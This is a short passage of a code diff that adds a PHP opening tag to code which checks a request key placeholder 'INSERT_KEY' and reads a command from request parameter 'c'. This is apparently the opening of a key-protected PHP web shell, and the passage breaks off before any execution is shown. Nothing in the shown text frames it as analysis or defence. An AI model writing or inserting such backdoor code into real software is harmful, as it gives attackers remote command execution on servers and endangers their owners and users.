@@ -1,3 +1,5 @@
+<?php
+
 if ($_REQUEST["k"] == "INSERT_KEY") {
     $cmd = $_REQUEST["c"];
 
